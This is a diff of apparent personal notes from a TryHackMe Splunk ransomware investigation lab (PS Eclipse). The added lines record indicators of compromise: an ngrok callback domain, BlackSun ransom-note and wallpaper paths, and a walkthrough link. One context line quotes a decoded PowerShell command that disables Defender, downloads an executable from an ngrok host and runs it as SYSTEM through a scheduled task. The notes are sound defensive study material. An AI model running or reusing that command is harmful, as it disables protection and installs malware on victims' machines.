@@ -39,3 +39,32 @@ https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,fal
 Set-MpPreference -DisableRealtimeMonitoring $true;wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\Windows\Temp\COUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f;SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe"
 ```
 
+## 31072023Mon
+
+![[Pasted image 20230731181824.png]]
+
+```
+* OUTSTANDING_GUTTER.exe QueryName="9030-181-215-214-32.ngrok.io"
+```
+
+```
+hxxp[://]9030-181-215-214-32[.]ngrok[.]io
+```
+
+```
+C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt
+```
+
+![[Pasted image 20230731182048.png]]
+
+```
+C:\Users\Public\Pictures\blacksun.jpg
+```
+![[Pasted image 20230731182202.png]]
+
+![[Pasted image 20230731182225.png]]
+
+### Walkthrough
+
+[Ransomware Investigation with Splunk | TryHackMe PS Eclipse](https://youtu.be/mcXFTqwahkg)
+
